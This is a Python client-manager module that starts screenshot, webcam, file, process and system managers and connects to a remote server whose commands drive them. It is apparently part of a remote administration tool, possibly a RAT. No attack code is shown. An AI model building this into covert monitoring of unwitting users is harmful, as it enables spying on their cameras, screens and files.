# client/managers/client_manager.py
import logging
from core.client_connector import ClientConnector
from core.command_handler import CommandHandler
from core.data_sender import DataSender
from managers.system_manager import SystemManager
from managers.process_manager import ProcessManager
from managers.screenshot_manager import ScreenshotManager
from managers.webcam_manager import WebcamManager  # Nova importação
from managers.file_manager import FileManager
logger = logging.getLogger("client.client_manager")
class ClientManager:
    def __init__(self, server_host, server_port):
        self.running = False
        self.system_manager = SystemManager()
        self.process_manager = ProcessManager()
        self.screenshot_manager = ScreenshotManager()
        self.webcam_manager = WebcamManager()  # Novo gerenciador
        self.file_manager = FileManager()
        self.connector = ClientConnector(server_host, server_port)
        self.data_sender = DataSender(self.connector, self.system_manager)
        self.command_handler = CommandHandler(
            self.connector,
            self.system_manager,
            self.process_manager, 
            self.screenshot_manager,
            self.webcam_manager,  # Passar para o manipulador de comandos
            self.file_manager
        )
        self.connector.set_handlers(self.command_handler, self.data_sender)
    def start(self):
        logger.info("Starting client")
        self.running = True
        self.system_manager.start()
        self.process_manager.start()
        self.screenshot_manager.start()
        self.webcam_manager.start()  # Iniciar o gerenciador de webcam
        self.file_manager.start()
        system_info = self.system_manager.get_info()
        connection_success = self.connector.connect(system_info)
        if connection_success:
            self.connector.start_communication()
        return connection_success
    def stop(self):
        if not self.running:
            return
        logger.info("Stopping client")
        self.running = False
        self.connector.disconnect()
        self.webcam_manager.stop()  # Parar o gerenciador de webcam
        self.file_manager.stop()
        self.screenshot_manager.stop()
        self.process_manager.stop()
        self.system_manager.stop()
        logger.info("Client stopped successfully")
